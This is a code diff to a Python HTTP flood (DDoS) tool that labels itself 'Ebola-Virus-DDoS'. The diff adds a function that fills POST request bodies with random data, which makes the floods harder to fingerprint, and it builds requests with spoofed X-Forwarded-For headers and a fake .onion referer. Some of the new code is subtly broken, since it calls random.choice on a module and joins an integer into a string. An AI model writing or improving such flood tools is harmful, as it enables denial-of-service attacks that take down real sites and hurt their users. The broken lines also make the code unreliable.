@@ -53,6 +53,12 @@ def check_all_ip_x_y(database,ip_list):
 
 	return info
 
+def GenDATA():
+    data = ""
+    for _ in range(random.randint(1,5)):
+        data += random.choice(string)
+    return data
+
 def setup():
 	f = open(ipfile,"r")
 	ip_list = f.readlines()
@@ -298,12 +304,13 @@ def flood(x):
     accept = "Accept: */*\r\n"
     fake_addr = "X-Forwarded-For: 1.1.1.1, 8.8.8.8, 1.0.0.1\r\n"
     referer = "Referer: http://netsec-reborn.onion/ebola-virus?id="+host+"\r\n"
+    post_data = GenDATA()
+    data_length = len(post_data)
+    content = "\r"
+    length = "\n"
     if attack_type =="POST":
         content = "X-Requested-With: XMLHttpRequest\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n"
-        length = "Content-Length: 16\r\n\nEbola-Virus-DDoS\r\n\r\n"
-    else:
-        content = "\r"
-        length = "\n"
+        length = "Content-Length: " + data_length + "\r\n\n" + post_data + "\r\n\r\n"
     event.wait()
     if bp ==1:
         pass
